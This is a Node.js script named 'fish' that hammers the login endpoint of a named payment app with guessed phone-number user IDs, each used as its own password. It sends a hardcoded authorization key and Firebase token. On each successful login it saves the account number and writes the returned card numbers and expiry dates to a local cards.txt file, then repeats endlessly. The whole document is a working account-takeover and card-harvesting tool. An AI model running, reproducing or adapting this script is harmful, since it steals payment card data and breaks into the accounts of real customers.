const fetch = require('node-fetch');
const fs = require("fs")
function fish(){
//var id = "012"+rand(7);
var id = "0125113504"
var pass =id;
var status;
var info;
//console.log("trying"+ id+"|"+pass)
fetch('https://syberapp.sybertechnology.com/api/login', {
    method: 'POST',
    headers: {
        'Host': 'syberapp.sybertechnology.com',
        'authorization': 'xwrsy67Un9oshl8H=c5g',
        'accept': 'application/json',
        'version': '100',
        'content-type': 'application/json;charset=utf-8',
        'content-length': '233',
        'accept-encoding': 'gzip',
        'user-agent': 'okhttp/4.9.1'
    },
    body: JSON.stringify({
        'userIdentifier': id,
        'fireBaseToken': 'diehJic_R7qwLo0wDm71k1:APA91bHsL-ye5a69TZ94Pd6e2wRW_KcXlbXWawyyFbsGudgfv4mQ-8kbJnNllyLzm9_rbdHxUJngaspTtpQQqtgr8N1M8HGzYWAjeZQrtwn2dlINzrjJLtrVO6z_jrHTYyXrs_7mxefO',
        'password': pass
    })
}).then((response)=>{
status = response.status;
return response.text()
  
}).then((data)=>{
  info = data;
  if(data.errorCode){
   var code = data.errorCode;
    if(code == 001){
      fish()
    }else if(code == 002){
      fish()
    }else{
  console.log(id + " "+data.errorMessageEn)
  fish()
    }
  }else{
    var data = JSON.parse(data)
    
    
fs.appendFile("numbers.txt",id+"\n",function (err) {if (err) throw err;console.log(id + " Success");});
  var cards = data.cards;
  if(cards.length > 0){
data.cards.forEach((card)=>{
    fs.appendFile("cards.txt",card.pan+"|"+card.expDate+"\n",function (err) {if (err) throw err;});})
  }
fish();
  }
    
  }).catch((err)=>{
    //console.log(err)
    fish()
 // console.log("Timed out?"+status);
  //console.log(info)
})
}
fish()

function rand(length) {
    var result           = '';
    var characters       = '0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}